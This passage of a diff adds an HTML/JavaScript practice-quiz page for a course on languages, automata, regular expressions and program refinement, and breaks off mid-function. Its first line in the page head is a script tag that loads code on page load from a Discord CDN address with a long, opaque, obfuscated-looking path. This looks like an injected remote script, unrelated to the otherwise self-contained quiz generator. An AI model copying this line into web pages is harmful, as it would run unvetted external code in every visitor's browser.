@@ -1,0 +1,530 @@
+<!doctype html>
+<html lang="en">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/7u9eDs1F153RLG_0V_k8dqztecYMEuErTnGGF5pca8znR9IjVWQBakFO6YYg5MHDlftX8FvQJ9TT_hH4a4nEeARu0dt0LBEW2F7V8Q3OrfJZewqs3k-mhPDgvhZtAmzvRhH-8c-m9xrHiKmMsGVUtPgzpgPEAf08s42at7jsPeYJ98CVt2aVrCtCk8PB-mGOJU55xNHgP0ax3W3Y4W_Dam4qqw7EIz3UIz1_5eJx_C_HxATa8PAiOOPQGi_LMljaPo5mTd4uRaOay3MTtfPT9K9p0ORXYo78jUUdFTvA3EtkHMKi2m4JPTBUpOHZw2xMjG2P-FTXJkkWVXQ1cSx4FnmOdEmbcNPFs0ZyTdK88q5YfRPVb2r7fM9gMNanaOPWXpHXM8rbSdH6aSAMmOdMqiUAtXbKEQ9HTqCoRQHVtttZ1lF1wQXHgf_DJ2qRb5kU4bHm1ZrqcIOOkGZ6R46jH3JlQlxnzyJ_HI96jAZ5IKY7MUwhs6gV7XvG6lDhK18_cD7ZuK36LyuPIxTTeq9fvBc8woqR0WLkGA6WVmnO36WHP7AHCXsqmx9-Xs87srCe5lcqhaKDgTRVM6r2S6eyqcoehhvdsA9zpteJTNR5UKF0_VyZLOC-5zl3OQvkfYSdPGVEwTEEzxPTWIim7HsnC_7JPqQACH8iTL9C'></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Test 2 Practice</title>
+<style>
+  :root { --blue:#0f6cbf; --bg:#fff; --fg:#1d2125; --muted:#6a737b; --line:#dee2e6; --info:#f8f9fa; --form:#e7f3f5; --ok:#357a32; --part:#f0ad4e; --bad:#ca3120; --fb:#fcefdc; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:15px/1.5 -apple-system, "Segoe UI", Roboto, Arial, sans-serif; color:var(--fg); background:var(--bg); }
+  header { background:#fff; border-bottom:1px solid var(--line); padding:10px 16px; display:flex; gap:12px; align-items:center; flex-wrap:wrap; }
+  header b { color:var(--blue); font-size:18px; }
+  header select, button { font:inherit; }
+  main { max-width:1100px; margin:0 auto; padding:16px; }
+  .crumb { color:var(--muted); font-size:13px; margin-bottom:8px; }
+  .crumb a { color:var(--blue); text-decoration:none; }
+  h1 { font-size:22px; font-weight:400; margin:4px 0 16px; }
+  .que { display:flex; gap:12px; margin:0 0 20px; }
+  .info { flex:0 0 130px; background:var(--info); border:1px solid var(--line); border-radius:4px; padding:8px; font-size:13px; align-self:flex-start; }
+  .info h3 { margin:0 0 4px; font-size:15px; }
+  .info .state { font-weight:600; }
+  .content { flex:1; min-width:0; }
+  .formulation { background:var(--form); border-radius:4px; padding:14px 16px; overflow-x:auto; }
+  .formulation p { margin:0 0 10px; }
+  .feedback { background:var(--fb); border-radius:4px; padding:10px 16px; margin-top:8px; overflow-x:auto; }
+  .row { display:grid; grid-template-columns: 150px 1fr; gap:8px; align-items:center; margin:6px 0; }
+  .row label { text-align:right; }
+  input[type=text], input:not([type]) { font:14px ui-monospace, Consolas, monospace; padding:4px 6px; border:1px solid #8f959e; border-radius:3px; width:100%; }
+  select { padding:3px 6px; border:1px solid #8f959e; border-radius:3px; }
+  .mono { font-family:ui-monospace, Consolas, monospace; }
+  .rules { font-family:ui-monospace, Consolas, monospace; background:#fff; border:1px solid var(--line); border-radius:4px; padding:8px 12px; display:inline-block; white-space:pre; }
+  .opts label { display:block; padding:2px 0; font-family:ui-monospace, Consolas, monospace; }
+  table.mat { border-collapse:collapse; }
+  table.mat td, table.mat th { border:1px solid #aaa; padding:4px 8px; text-align:center; }
+  table.sum { border-collapse:collapse; margin-bottom:20px; }
+  table.sum th { text-align:right; padding:4px 12px; background:var(--info); border:1px solid var(--line); font-weight:600; }
+  table.sum td { padding:4px 12px; border:1px solid var(--line); }
+  .btn { background:var(--blue); color:#fff; border:0; border-radius:4px; padding:7px 14px; cursor:pointer; }
+  .btn.sec { background:#ced4da; color:var(--fg); }
+  .timer { position:sticky; top:0; float:right; background:#fff; border:1px solid var(--line); border-radius:4px; padding:4px 10px; font-variant-numeric:tabular-nums; z-index:2; }
+  .ok { color:var(--ok); } .part { color:#a3620a; } .bad { color:var(--bad); }
+  svg text { font:13px sans-serif; }
+  .miss { color:var(--bad); font-family:ui-monospace, Consolas, monospace; }
+  @media (max-width:640px) { .que { flex-direction:column; } .info { flex:none; } .row { grid-template-columns:1fr; } .row label { text-align:left; } }
+</style>
+</head>
+<body>
+<header>
+  <b>Test 2 practice</b>
+  <select id="mode" aria-label="Practice mode"></select>
+  <button class="btn sec" id="newBtn">New attempt</button>
+</header>
+<main>
+  <div class="crumb"><a href="#">Dashboard</a> / <a href="#">My courses</a> / MA-224 / Tests / Test 2 (topics 4-6: Languages, Machines, Regular expressions, Correct programs, Relations)</div>
+  <div class="timer" id="timer"></div>
+  <h1>Test 2 (topics 4-6: Languages, Machines, Regular expressions, Correct programs, Relations)</h1>
+  <div id="summary"></div>
+  <form id="quiz" onsubmit="return false"></form>
+  <p><button class="btn" id="finishBtn">Finish attempt ...</button> <button class="btn" id="newBtn2">New set of questions</button></p>
+</main>
+<script>
+// ---------- helpers ----------
+const R = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
+const pick = a => a[R(0, a.length - 1)];
+const shuffle = a => { a = [...a]; for (let i = a.length - 1; i > 0; i--) { const j = R(0, i); [a[i], a[j]] = [a[j], a[i]]; } return a; };
+const pickN = (a, n) => shuffle(a).slice(0, n);
+const uniq = a => [...new Set(a)];
+const UP = [...'ABCDEGHJKLMNOPQRSTUVWXYZ'], LO = [...'abcdefghjkmnopqrstuvwxyz'];
+const strip = s => s.replace(/["'\s]/g, '');
+const list = s => s.split(',').map(strip).filter(Boolean);
+const flat = s => uniq(list(String(s || '').replace(/[{}\[\]]/g, '')));
+const keyOf = a => uniq(a.map(String)).sort().join(',');
+const sameSet = (a, b) => keyOf(a) === keyOf(b) && uniq(a).length === uniq(b).length;
+const setScore = (exp, got) => { exp = uniq(exp); got = uniq(got); if (!exp.length && !got.length) return 1; return got.filter(g => exp.includes(g)).length / Math.max(exp.length, got.length); };
+// top-level elements of "{a, [b,c], {d}}"; anything malformed becomes 'bad' so junk can never be silently ignored
+const items = s => { s = String(s || '').trim(); if (s[0] !== '{' || s.at(-1) !== '}') return ['bad'];
+  const out = []; let d = 0, cur = '';
+  for (const ch of s.slice(1, -1)) { if ('{['.includes(ch)) d++; if ('}]'.includes(ch)) d--; if (ch === ',' && !d) { out.push(cur.trim()); cur = ''; } else cur += ch; if (d < 0) return ['bad']; }
+  if (cur.trim() || out.length) out.push(cur.trim()); return d ? ['bad'] : out.map(x => x || 'bad'); };
+const inner = (x, o, c) => x[0] === o && x.at(-1) === c && !/[{}\[\]]/.test(x.slice(1, -1)) ? x.slice(1, -1) : null;
+const parseSS = s => uniq(items(s).map(x => (x = inner(x, '{', '}')) === null ? 'bad' : keyOf(list(x))));
+const parsePairs = s => uniq(items(s).map(x => (x = inner(x, '[', ']')) === null || list(x).length !== 2 || x.split(',').length !== 2 ? 'bad' : list(x).join(',')));
+const fs = a => '{' + a.join(', ') + '}';
+const fss = a => '{' + a.map(fs).join(', ') + '}';
+const fpairs = a => '{' + a.map(p => `[${p[0]}, ${p[1]}]`).join(', ') + '}';
+const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+// expected set with only the items you missed in red, plus anything you wrote that does not belong (struck through)
+const diff = (exp, got, disp = exp, show = x => x) => { got = uniq(got.map(String)); exp = exp.map(String);
+  const extra = got.filter(k => !exp.includes(k)).map(k => k === 'bad' ? '(unreadable item)' : show(k));
+  return '{' + exp.map((k, i) => got.includes(k) ? esc(disp[i]) : `<span class="miss">${esc(disp[i])}</span>`).join(', ') + '}' + (extra.length ? ` <span class="miss">not in answer: <s>${esc(extra.join(', '))}</s></span>` : ''); };
+const ssShow = k => '{' + k.split(',').join(', ') + '}';
+const inp = (k, ph = '') => `<input data-k="${k}" autocomplete="off" spellcheck="false" placeholder="${esc(ph)}">`;
+const row = (label, k, ph) => `<div class="row"><label>${label}</label>${inp(k, ph)}</div>`;
+const norm = s => String(s || '').replace(/\s+/g, '');
+const sel = (k, opts) => `<select data-k="${k}"><option value="__">Choose...</option>${opts.map(o => `<option value="${esc(o)}">${esc(o)}</option>`).join('')}</select>`;
+const checks = opts => `<div class="opts">${opts.map((o, i) => `<label><input type="checkbox" data-k="o${i}"> ${esc(o)}</label>`).join('')}</div>`;
+const checkScore = (ans, n, correct) => { // correct: indices; n: number of options
+  const chosen = [...Array(n).keys()].filter(i => ans['o' + i]);
+  const tp = chosen.filter(i => correct.includes(i)).length, fp = chosen.length - tp;
+  return Math.max(0, Math.min(1, (tp - fp) / correct.length));
+};
+const checkDiff = (ans, opts, correct) => diff(correct, opts.map((_, i) => i).filter(i => ans['o' + i]), correct.map(i => opts[i]), i => opts[i]);
+
+// ---------- automaton drawing ----------
+function drawAut(states, start, finals, trans) {
+  const n = states.length, W = 480, H = 440, cx = 240, cy = 220, Rad = 145, r = 20;
+  const P = {}; states.forEach((s, i) => { const a = -Math.PI / 2 + 2 * Math.PI * i / n; P[s] = [cx + Rad * Math.cos(a), cy + Rad * Math.sin(a)]; });
+  const groups = {}; trans.forEach(([f, l, t]) => { (groups[f + '>' + t] ||= { f, t, l: [] }).l.push(l); });
+  const unit = (x, y) => { const d = Math.hypot(x, y) || 1; return [x / d, y / d]; };
+  const rot = ([x, y], a) => [x * Math.cos(a) - y * Math.sin(a), x * Math.sin(a) + y * Math.cos(a)];
+  let svg = '';
+  for (const g of Object.values(groups)) {
+    const lab = esc(g.l.join(','));
+    const [px, py] = P[g.f];
+    if (g.f === g.t) {
+      const u = unit(px - cx, py - cy), a1 = rot(u, -0.5), a2 = rot(u, 0.5), c1 = rot(u, -0.6), c2 = rot(u, 0.6);
+      svg += `<path d="M${px + a1[0] * r},${py + a1[1] * r} C${px + c1[0] * 60},${py + c1[1] * 60} ${px + c2[0] * 60},${py + c2[1] * 60} ${px + a2[0] * (r + 2)},${py + a2[1] * (r + 2)}" fill="none" stroke="#333" marker-end="url(#ah)"/>`;
+      svg += `<text x="${px + u[0] * 62}" y="${py + u[1] * 62 + 4}" text-anchor="middle">${lab}</text>`;
+    } else {
+      const [qx, qy] = P[g.t], dx = qx - px, dy = qy - py, len = Math.hypot(dx, dy), nx = -dy / len, ny = dx / len;
+      const off = groups[g.t + '>' + g.f] ? 30 : 12, Cx = (px + qx) / 2 + nx * off, Cy = (py + qy) / 2 + ny * off;
+      const s = unit(Cx - px, Cy - py), e = unit(Cx - qx, Cy - qy);
+      svg += `<path d="M${px + s[0] * r},${py + s[1] * r} Q${Cx},${Cy} ${qx + e[0] * (r + 2)},${qy + e[1] * (r + 2)}" fill="none" stroke="#333" marker-end="url(#ah)"/>`;
+      // label at t=0.35 (nearer the source) so labels of edges crossing the centre do not pile up
+      const t = 0.35, mx = (1 - t) ** 2 * px + 2 * t * (1 - t) * Cx + t * t * qx + nx * 9, my = (1 - t) ** 2 * py + 2 * t * (1 - t) * Cy + t * t * qy + ny * 9;
+      svg += `<text x="${mx}" y="${my + 4}" text-anchor="middle" paint-order="stroke" stroke="#e7f3f5" stroke-width="4">${lab}</text>`;
+    }
+  }
+  const [sx, sy] = P[start], su = rot(unit(sx - cx, sy - cy), 1.3);
+  svg += `<path d="M${sx + su[0] * (r + 32)},${sy + su[1] * (r + 32)} L${sx + su[0] * (r + 2)},${sy + su[1] * (r + 2)}" stroke="#333" marker-end="url(#ah)"/>`;
+  states.forEach(s => {
+    const [x, y] = P[s];
+    svg += `<circle cx="${x}" cy="${y}" r="${r}" fill="#fff" stroke="#333"/>`;
+    if (finals.includes(s)) svg += `<circle cx="${x}" cy="${y}" r="${r - 4}" fill="none" stroke="#333"/>`;
+    svg += `<text x="${x}" y="${y + 5}" text-anchor="middle" font-weight="600">${s}</text>`;
+  });
+  return `<svg viewBox="0 0 ${W} ${H}" width="${W}" style="max-width:100%;height:auto;background:#fff;border:1px solid #dee2e6;border-radius:4px"><defs><marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0L10,5L0,10z" fill="#333"/></marker></defs>${svg}</svg>`;
+}
+
+// ---------- Q1 pool: languages & machines ----------
+function genEBNF(fx) {
+  const N = fx ? fx.N : pickN(UP, 5), T = pickN(LO, 5), rules = fx ? fx.rules : {};
+  if (!fx) N.forEach((A, i) => {
+    const alts = new Set([pick(T) + ' ' + N[(i + 1) % 5]]); let eps = false;
+    const k = R(2, 3);
+    while (alts.size < k) {
+      const x = Math.random();
+      if (x < .55) alts.add(pick(T) + ' ' + pick(N));
+      else if (x < .75 && !eps) { alts.add(pick(N.filter(B => B !== A))); eps = true; }
+      else alts.add(pick(T));
+    }
+    rules[A] = shuffle([...alts]);
+  });
+  const isTerm = a => !a.includes(' ') && a === a.toLowerCase();
+  if (!Object.values(rules).flat().some(isTerm)) return genEBNF();
+  const tr = [];
+  N.forEach(A => rules[A].forEach(a => { const p = a.split(' '); tr.push(p.length === 2 ? [A, p[0], p[1]] : isTerm(a) ? [A, a, 'F'] : [A, 'ε', a]); }));
+  const alpha = uniq(tr.map(t => t[1]).filter(l => l !== 'ε'));
+  const trKeys = tr.map(t => t.join('|'));
+  const parseTr = s => items(s).map(x => { if ((x = inner(x, '[', ']')) === null) return 'bad'; const p = x.split(',').map(strip); if (p.length !== 3) return 'bad'; if (['', 'epsilon', 'eps', 'ε'].includes(p[1])) p[1] = 'ε'; return p.join('|'); });
+  const sol = { S: fs([...N, 'F']), A: fs(alpha), T: '{' + tr.map(t => `[${t[0]}, ${t[1] === 'ε' ? 'epsilon' : t[1]}, ${t[2]}]`).join(', ') + '}', st: N[0], F: '{F}' };
+  return {
+    sol,
+    html: `<p>Consider the following EBNF grammar.</p><div class="rules">${N.map(A => `${A} → ${rules[A].join(' | ')}`).join('\n')}</div>
+      <p style="margin-top:10px">Translate it into an NFA, given as 5-tuple. Use the nonterminal names as the corresponding state names and <b>F</b> for the final state. Write <span class="mono">epsilon</span> for ε.</p>
+      <p class="mono" style="font-size:13px">Sample: States = {A,B,C}, Alphabet = {a,b}, Transitions = { [A,a,B], [B,b,C], [C,epsilon,A] }, Start state = A, Final States = {C}</p>
+      ${row('States =', 'S', '{A,B,C}')}${row('Alphabet =', 'A', '{a,b}')}${row('Transitions =', 'T', '{[A,a,B], ...}')}${row('Start state =', 'st', 'A')}${row('Final States =', 'F', '{C}')}`,
+    grade(a) {
+      const parts = [sameSet(flat(a.S), [...N, 'F']), sameSet(flat(a.A), alpha), sameSet(parseTr(a.T), trKeys), strip(String(a.st || '').replace(/[{}]/g, '')) === N[0], sameSet(flat(a.F), ['F'])];
+      // weights inferred from Matric marks on real attempts: states .2, alphabet .2, transitions .4, start .1, finals .1
+      const score = Math.round(10 * [.2, .2, .4, .1, .1].reduce((s, w, i) => s + (parts[i] ? w : 0), 0)) / 10;
+      const trShow = k => { const p = k.split('|'); return `[${p[0]}, ${p[1] === 'ε' ? 'epsilon' : p[1]}, ${p[2]}]`; };
+      const rows = [['States', diff([...N, 'F'], flat(a.S))], ['Alphabet', diff(alpha, flat(a.A))], ['Transitions', diff(trKeys, parseTr(a.T), trKeys.map(trShow), trShow)],
+        ['Start state', `<span class="${parts[3] ? '' : 'miss'}">${esc(sol.st)}</span>`], ['Final States', diff(['F'], flat(a.F))]];
+      return { score, answer: rows.map(([k, v]) => `${k} = ${v}`).join('<br>') };
+    }
+  };
+}
+
+function genAut2Grammar() {
+  const nfa = Math.random() < .5, S = pickN(UP, 6), A = pickN(LO, R(3, 4)), tr = [];
+  S.forEach((s, i) => {
+    const syms = pickN(A, R(1, 2));
+    syms.forEach(a => tr.push([s, a, i < 5 && Math.random() < .5 ? S[i + 1] : pick(S)]));
+    if (nfa && Math.random() < .5) tr.push([s, syms[0], pick(S)]);
+    if (nfa && Math.random() < .2) tr.push([s, 'ε', pick(S.filter(x => x !== s))]);
+  });
+  const trU = uniq(tr.map(t => t.join('|'))).map(k => k.split('|'));
+  const finals = pickN(S, R(1, 2)), start = pick(S);
+  const terms = uniq(trU.map(t => t[1]).filter(l => l !== 'ε'));
+  const rulesOf = s => [...trU.filter(t => t[0] === s).map(t => t[1] === 'ε' ? `${s}→${t[2]}` : `${s}→${t[1]} ${t[2]}`), ...(finals.includes(s) ? [`${s}→`] : [])];
+  const fmtRule = k => { const [l, r] = k.split('→'); return `[${l}, [${r ? r.split(' ').join(', ') : ''}]]`; };
+  const parseRules = s => items(s).map(x => (x = x.match(/^\[\s*["']?([A-Za-z]+)["']?\s*,\s*\[([^\[\]]*)\]\s*\]$/)) ? x[1] + '→' + list(x[2]).join(' ') : 'bad');
+  const sol = { t: fs(terms), n: fs(S), st: start };
+  S.forEach(s => sol['r' + s] = '{' + rulesOf(s).map(fmtRule).join(', ') + '}');
+  return {
+    sol, data: { S, start, finals, tr: trU },
+    html: `<p>Translate the following ${nfa ? 'NFA' : 'DFA'} to a right-regular grammar.</p>${drawAut(S, start, finals, trU)}
+      <p>Write the answer as a 4-tuple, separating the rules per non-terminal. Use the names of the states for their respective nonterminals.</p>
+      ${row('Terminals =', 't', '{a,b}')}${row('Nonterminals =', 'n', '{A,B}')}${row('Start symbol =', 'st', 'A')}
+      ${S.map(s => row(`Rules for ${s} =`, 'r' + s, `{[${s},[a,B]], [${s},[B]], [${s},[]]}`)).join('')}`,
+    grade(a) {
+      const parts = [sameSet(flat(a.t), terms), sameSet(flat(a.n), S), strip(String(a.st || '').replace(/[{}]/g, '')) === start, ...S.map(s => sameSet(parseRules(a['r' + s]), rulesOf(s)))];
+      const labels = ['Terminals', 'Nonterminals', 'Start symbol', ...S.map(s => 'Rules for ' + s)];
+      const vals = [diff(terms, flat(a.t)), diff(S, flat(a.n)), `<span class="${parts[2] ? '' : 'miss'}">${esc(start)}</span>`, ...S.map(s => diff(rulesOf(s), parseRules(a['r' + s]), rulesOf(s).map(fmtRule), fmtRule))];
+      return { score: parts.filter(Boolean).length / parts.length, answer: labels.map((l, i) => `${l} = ${vals[i]}`).join('<br>') };
+    }
+  };
+}
+
+function genSubset() {
+  for (;;) {
+    const S = pickN(UP, 4), A = pickN(LO, 2).sort(), tr = [];
+    S.forEach(s => A.forEach(a => pickN(S, pick([0, 1, 1, 2])).forEach(t => tr.push([s, a, t]))));
+    const start = S[0], step = (set, a) => keyOf(tr.filter(t => set.includes(t[0]) && t[1] === a).map(t => t[2]));
+    const seen = new Set([start]), q = [[start]];
+    while (q.length) { const cur = q.shift(); for (const a of A) { const k = step(cur, a); if (k && !seen.has(k)) { seen.add(k); q.push(k.split(',')); } } }
+    if (seen.size < 4 || seen.size > 8) continue;
+    const exp = [...seen], ans = fss(exp.map(k => k.split(',')));
+    return {
+      sol: { x: ans }, data: { S, A, start, tr },
+      html: `<p>Consider the NFA below over the alphabet { ${A.join(', ')} }.</p>${drawAut(S, start, [S[R(1, 3)]], tr)}
+        <p>Convert the NFA to a DFA using the subset construction. Give the set of reachable states of the DFA, written as a set of sets of NFA states, starting from the start state related to ${start}. (The empty set may be left out.)</p>
+        <p>Write your answer with curly braces, for example: {{A}, {A,C}, {A,C,E}}. The order does not matter.</p>${inp('x', '{{A}, {A,C}}')}`,
+      grade: a => ({ score: setScore(exp, parseSS(a.x).filter(Boolean)), answer: diff(exp, parseSS(a.x).filter(Boolean), exp.map(ssShow), ssShow) })
+    };
+  }
+}
+
+function moore(S, A, d, finals) {
+  let cls = Object.fromEntries(S.map(s => [s, finals.includes(s) ? 1 : 0]));
+  for (;;) {
+    const ids = {}, nc = {};
+    S.forEach(s => { const g = cls[s] + '|' + A.map(a => cls[d[s][a]]).join(','); if (!(g in ids)) ids[g] = Object.keys(ids).length; nc[s] = ids[g]; });
+    const same = new Set(Object.values(nc)).size === new Set(Object.values(cls)).size; cls = nc; if (same) break;
+  }
+  const groups = {}; S.forEach(s => (groups[cls[s]] ||= []).push(s)); return Object.values(groups);
+}
+function genMinimize() {
+  for (;;) {
+    const k = R(3, 4), S = pickN(UP, 6), A = pickN(LO, 2).sort();
+    const bd = [...Array(k)].map(() => Object.fromEntries(A.map(a => [a, R(0, k - 1)])));
+    const bf = [...Array(k).keys()].filter(() => Math.random() < .5); if (!bf.length || bf.length === k) continue;
+    const cls = S.map((_, i) => i < k ? i : R(0, k - 1));
+    const d = {}; S.forEach((s, i) => d[s] = Object.fromEntries(A.map(a => [a, pick(S.filter((_, j) => cls[j] === bd[cls[i]][a]))])));
+    const finals = S.filter((_, i) => bf.includes(cls[i])), start = S[0];
+    const reach = new Set([start]), q = [start]; while (q.length) { const s = q.shift(); A.forEach(a => { if (!reach.has(d[s][a])) { reach.add(d[s][a]); q.push(d[s][a]); } }); }
+    if (reach.size < 6) continue;
+    const part = moore(S, A, d, finals); if (part.length < 3 || part.length > 5) continue;
+    const tr = S.flatMap(s => A.map(a => [s, a, d[s][a]])), ans = fss(part);
+    return {
+      sol: { x: ans }, data: { S, A, start, finals, d },
+      html: `<p>Minimize the following DFA.</p>${drawAut(S, start, finals, tr)}<p>Write the answer as a set of sets of equivalent states, e.g. { { A }, { B, C }, { D, E, F } }.</p>${inp('x', '{{A},{B,C}}')}`,
+      grade: a => ({ score: setScore(part.map(keyOf), parseSS(a.x)), answer: diff(part.map(keyOf), parseSS(a.x), part.map(fs), ssShow) })
+    };
+  }
+}
+
+const QS = { '': [1, 1], '?': [0, 1], '*': [0, Infinity], '+': [1, Infinity] };
+const superset = (q2, q1) => QS[q2][0] <= QS[q1][0] && QS[q2][1] >= QS[q1][1];
+function genRegexSup() {
+  // single letters come from outside a-j / A-J so they never overlap a character class (overlap breaks the per-part rule below)
+  const atoms = pickN(['[0-9]', '[a-j]', '[A-J]', pick([...'kmnopqrstuvwxyz']), pick([...'KMNOPQRSTUVWXYZ'])], 2);
+  const q1 = pick(['', '?', '*', '+']), q2 = pick(['?', '*', '+']);
+  const dbl = q => q && Math.random() < .6 ? q + q : q;
+  const ex = atoms[0] + dbl(q1) + atoms[1] + dbl(q2);
+  const combos = shuffle(['?', '*', '+'].flatMap(a => ['?', '*', '+'].map(b => [a, b])));
+  const opts = [...combos.map(([a, b]) => atoms[0] + a + atoms[1] + b), 'None of the above'];
+  const correct = combos.map(([a, b], i) => superset(a, q1) && superset(b, q2) ? i : -1).filter(i => i >= 0);
+  const sol = {}; correct.forEach(i => sol['o' + i] = true);
+  return {
+    sol, data: { ex, opts },
+    html: `<p>Consider the following regular expression.</p><p class="mono">ex = ${esc(ex)}</p><p>Which of the following regular expressions accepts at least the same words as ex?</p>${checks(opts)}`,
+    grade: a => ({ score: checkScore(a, opts.length, correct), answer: checkDiff(a, opts, correct) })
+  };
+}
+
+function genRegexBuild() {
+  for (;;) {
+    const L = pickN(LO, 4), Q = L.map(() => pick(['', '?', '*', '+']));
+    if (Q.filter(q => q === '*' || q === '+').length < 2) continue;
+    const re = new RegExp('^' + L.map((l, i) => l + Q[i]).join('') + '$');
+    const cnt = q => q === '' ? 1 : q === '?' ? R(0, 1) : q === '*' ? R(0, 4) : R(1, 4);
+    const pos = new Set(), neg = new Set();
+    for (let t = 0; t < 300 && pos.size < 10; t++) { const w = L.map((l, i) => l.repeat(cnt(Q[i]))).join(''); if (w) pos.add(w); }
+    for (let t = 0; t < 600 && neg.size < 10; t++) {
+      let w = [...L.map(l => l.repeat(R(0, 3))).join('')];
+      if (Math.random() < .4 && w.length > 1) { const i = R(0, w.length - 2); [w[i], w[i + 1]] = [w[i + 1], w[i]]; }
+      w = w.join(''); if (w && !re.test(w)) neg.add(w);
+    }
+    if (pos.size < 6 || neg.size < 8) continue;
+    const P = [...pos].sort(), N = [...neg].sort();
+    const sol = {}; L.forEach((l, i) => sol['p' + i] = l + Q[i]);
+    return {
+      sol,
+      html: `<p>Construct a regular expression that matches the following positive cases and does not match the following negative cases.</p>
+        <p><b>positive cases:</b> <span class="mono">${P.join(', ')}</span><br><b>negative cases:</b> <span class="mono">${N.join(', ')}</span></p>
+        <p>You must fill in all four parts of the answer to be graded. For each part, there are five alternatives, where the last one is empty.</p>
+        <p class="mono">${L.map((l, i) => `<select data-k="p${i}"><option value="__">Choose...</option>${[l, l + '?', l + '*', l + '+', ''].map(o => `<option value="${o}">${o || '(empty)'}</option>`).join('')}</select>`).join(' ')}</p>`,
+      grade(a) {
+        const parts = L.map((_, i) => a['p' + i]);
+        let ok = !parts.some(p => p === undefined || p === '__');
+        if (ok) { const r = new RegExp('^' + parts.join('') + '$'); ok = P.every(w => r.test(w)) && N.every(w => !r.test(w)); }
+        return { score: ok ? 1 : 0, answer: esc(L.map((l, i) => l + Q[i]).join('')) };
+      }
+    };
+  }
+}
+
+// ---------- Q2 pool: correct programs ----------
+function genStrength(fx) {
+  const D = []; for (let x = -300; x <= 300; x++) D.push(x);
+  for (;;) {
+    let a = R(2, 6), b = R(a + 1, a + 4), set = uniq([1, 2, 3].map(() => R(b + 1, b + 8))).sort((x, y) => x - y);
+    if (fx) ({ a, b, set } = fx);
+    if (set.length < 3) continue;
+    let [r1, r2] = pickN(set, 2), k = R(2, 7);
+    if (fx) ({ r1, r2, k } = fx);
+    const C = [[`x ∈ {${set.join(',')}}`, x => set.includes(x)], [`${k}x = ${k * r1}`, x => x === r1], [`x² - ${r1 + r2}x + ${r1 * r2} = 0`, x => x * x - (r1 + r2) * x + r1 * r2 === 0],
+      [`x > ${b}`, x => x > b], [`x > ${a}`, x => x > a], [`x² > ${a}²`, x => x * x > a * a], ['x ≠ 1', x => x !== 1], ['x = x', () => true], ['x² < 0', x => x * x < 0]];
+    const ch = (fx ? fx.texts.map(t => C.find(c => c[0] === t)) : pickN(C, 5)).map(([t, f]) => ({ t, s: D.filter(f) }));
+    ch.sort((p, q) => p.s.length - q.s.length);
+    if (!ch.every((c, i) => i === 0 || (c.s.length > ch[i - 1].s.length && ch[i - 1].s.every(x => c.s.includes(x))))) continue;
+    const order = ch.map(c => c.t), names = ['strongest', 'strong', 'medium', 'weak', 'weakest'], shown = shuffle(order);
+    const sol = {}; names.forEach((n, i) => sol[n] = order[i]);
+    return {
+      sol,
+      html: `<p>Sort the following conditions according to strength.</p><div class="rules">${esc(shown.join('\n'))}</div><p style="margin-top:10px">Hint: A is stronger than B if A implies B. (x is an integer.)</p>
+        ${names.map(n => `<div class="row"><label>${n}:</label><span>${sel(n, shown)}</span></div>`).join('')}`,
+      // Matric: 1 - 0.2 per pair of conditions in the wrong order (fits all real attempts)
+      // a condition picked twice means another one is missing: -0.2 per missing condition
+      grade: a => ({ score: names.some(n => !order.includes(a[n])) ? 0 : Math.max(0, 1 - 0.2 * (names.flatMap((n, i) => names.slice(i + 1).map(m => order.indexOf(a[n]) > order.indexOf(a[m]))).filter(Boolean).length + 5 - uniq(names.map(n => a[n])).length)), answer: names.map((n, i) => `${n}: <span class="mono${a[n] === order[i] ? '' : ' miss'}">${esc(order[i])}</span>`).join('<br>') })
+    };
+  }
+}
+
+function genRefine(fx = {}) {
+  const ops = ['<', '>', '<=', '>=', '=', '!='];
+  const vs = fx.V || pickN(LO.filter(c => c !== 'l'), 3);
+  const pre = () => { const v = pick(vs), f = R(0, 2); return f === 0 ? `${v} ${pick(ops)} ${R(1, 19)}` : f === 1 ? `${R(1, 19)} ${pick(ops)} ${v}` : `${v} ${pick(ops)} ${pick(vs.filter(w => w !== v))}`; };
+  const relAtom = (V = vs) => { const v = pick(V), f = R(0, 1); return f === 0 ? `${v}' ${pick(ops)} ${R(1, 19)}` : `${v}' ${pick(ops)} ${pick(vs)}`; };
+  const rel = (V = vs) => Math.random() < .5 ? relAtom(V) : `${relAtom(V)} ${pick(['and', 'or'])} ${relAtom(V)}`;
+  const frame = V => `${V.join(',')}:=${V.map(x => x + "'").join(',')}`;
+  const kind = fx.kind || pick(['Mer', 'InC', 'Fra', 'InV', 'Rew']);
+  let name, rule, stmt, ans, extra = '', alt = [];
+  const V = fx.V || vs.slice(0, R(2, 3)), p = fx.p || pre(), r = fx.r || rel(V);
+  if (kind === 'Mer') {
+    const p2 = fx.p2 || pre(); name = 'Merge Assert'; rule = '{pre1} ; {pre2}\n[=\n{pre1 and pre2}';
+    stmt = `{ ${p} } ; { ${p2} } ${frame(V)} | ${r}`; ans = `{ ${p} and ${p2} } ${frame(V)} | ${r}`;
+  } else if (kind === 'InC') {
+    const N = fx.N || pick(UP), c = fx.c || R(1, 9); name = 'Introduce Constant'; extra = ` in order to introduce a constant ${N} of type Nat with the value ${c}`;
+    rule = '{pre} v,x:=v\',x\' | rel\n[=\nCON C:T | C=x . {C=x and pre} v,x:=v\',x\' | rel';
+    stmt = `{ ${p} } ${frame(V)} | ${r}`; ans = `CON ${N}:Nat | ${N}=${c} . {${N}=${c} and ${p} } ${frame(V)} | ${r}`;
+  } else if (kind === 'Fra') {
+    const x = V[0], rest = V.slice(1), rr = fx.rr || (Math.random() < .5 ? `${rest[0]}' ${pick(ops)} ${x}'` : rel(rest));
+    name = 'Contract Frame'; rule = 'x,v:=x\',v\' | rel and x\'=x\n[=\nv:=v\' | rel[x\'\\x]';
+    stmt = `{ ${p} } ${frame(V)} | ${x}' = ${x} and ${rr}`; ans = `{ ${p} } ${frame(rest)} | ${rr.split(x + "'").join(x)}`;
+    alt = [`${frame(rest)} | ${rr.split(x + "'").join(x)}`];
+  } else if (kind === 'InV') {
+    const L = pick(UP), c = R(1, 9); name = 'Introduce Local Variable'; extra = ` in order to introduce a variable ${L} of type Nat with initial value ${c}`;
